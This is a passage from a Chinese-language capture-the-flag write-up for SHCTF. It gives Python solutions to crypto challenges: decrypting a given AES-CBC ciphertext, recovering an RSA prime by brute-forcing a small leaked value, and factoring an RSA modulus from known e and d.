![image-20241027165401679](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410271654740.png)

然后我们访问index.php，得到flag

![image-20241027165423249](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410271654308.png)

#### [Week3] 顰



### CRYPTO

#### [Week1] EzAES

我们直接解密就行

```
from Crypto.Cipher import AES

# 密钥和 IV，使用加密时生成的值
key = b'p[b\x80~\xaa\xb2\xd3)l\x1eW\xcc\x85)\x10'
iv = b'\xd0cFp=\x9eW\xad\xact&\xbb\xb4\x0cV\xd4'

# 创建 AES 解密对象
my_aes = AES.new(key, AES.MODE_CBC, iv)

# 加密后的密文
ciphertext = b'\x01\xbd\x93\x96\xa3;\x1eW\xfa\xf1\xec\x10\xb8Ks\x86\x9d]\x87\x932\xfc0\xda\r\x98\xcfv\xb4\xb4Vj5\xe8\xd1\x88\xf5\x9a\xa8\x89\xa2\xebVj;4\x90j'

# 解密
decrypted = my_aes.decrypt(ciphertext)

# 移除填充的空格字节
plaintext = decrypted.rstrip(b' ')
print(plaintext)
```

#### [Week1] baby_mod

![image-20241031201709131](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410312017171.png)

此时我们知道了r，也就是说如果我们知道了tmp，就能计算出r对于t的逆元，就可以求出p，而tmp只有15bit，可以很快的遍历出来。

遍历p，逐一解密密文，明文中包含SHCTF的即为所求

```

from Crypto.Util.number import *
import gmpy2
from tqdm import *

c = 79650255924640441243783174315738119783087054428100187253964031045992984620971879440861726176524336451142891982435118150281255051661584547445199746244544425882305155402589125955199617147930949561958885307377843571691020998368159145257218511196817046406536607508747287748359813285385239057197003234628847079939
leak = -2599222796268155672542615057820311188233596084301204730398124299903057773299164321565684294941437840950319988869184017952143214614546298874735930095707443093006166798980132582791121684360595863075969212106829764572515951966651060430710482809252673230819220874013454674514944846921907088042630911813223918291506413183923253016666716689505955468069348342349098701467897450818524506135076565
r = 587682058314915471307923755715428788638634300872408087916288745237852083576968681013764877646877289262026854782255141434805121509775923799604299891162530112557931041695494035876437072363827072790300504458703299756480581043027342577811
t = 786699786866467436790075506076086854735027138153074424854186047828932863337885476336794620298737490235145874475196933459185319123588161523141227394517491113980132701124357536717210954797397468992341668471278315484594606850091171557027
e = 65537
for tmp in trange(2**14,2**15-1):
    if isPrime(tmp):
        p = (leak+tmp)*gmpy2.invert(r,t) % t
        try:
            d = gmpy2.invert(e,p-1)
            m = pow(c,d,p)
            flag = long_to_bytes(m)
            if b'SHCTF' in flag:
                print(flag)
                break
        except:
            pass
```

#### **[Week1] d_known**

我们已知e和d的值

![image-20241031202659774](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410312026817.png)

通过计算可知，e是17位，d是2047为，phi大概是2048位，因此我们可以推测k的值

然后求pq,q = next_prime(p),qp接近，直接对phi开方然后用next_prime、prevprime即可求出pq

```

from Crypto.Util.number import *
import gmpy2
import sympy
from tqdm import*
c = 7619231789171995079294161234878423224231112429961838535540784984692964815324726959511719538222968332975752824731741518178086141907611550871403019016043596256109736194533826456432379700265157548262751707387902955474794955342745211189261217839388458558541610855570638979485715875458613584721374740387313646656453429749782646888147442107673006666786913122872882361836572072790817898782976016388830432654146591375959261230147062213668563221742359906177903255156356636148427480411387914934792027752124681828051885054176487796901097076771710538908474521518771489253933284065313644010703407250057718304709566471764216008833
d = 4294890607908962616910170813936418137933989254123469803555687713508290441430349302109331416858412706457372735008848759911973894659751982291314717306592060486109717936934227859107527548007636110978177943504153504830427399670018088103145473328301738295079451783784918523654258608563796681268583347612365317742686170548984200881695503824129779720121644547769626667999547773210219170161559351337037056795720068516329254135806201887544486689070012222188533868735009912244250883223795602440999145676619713422671945150578230992434086632731164719925391045521061782211037385447361025091612158568846980146769425987904420426593
e = 65537
kphi = e*d-1
for i in trange(2**13,2**17):
    if kphi%i == 0:
        phi = kphi//i
        temp = gmpy2.iroot(phi,2)[0]
        p = gmpy2.next_prime(temp)
        q = sympy.prevprime(temp)
        if d == inverse(e,(p-1)*(q-1)):
            m = pow(c,d,p*q)
            print(long_to_bytes(m))
```

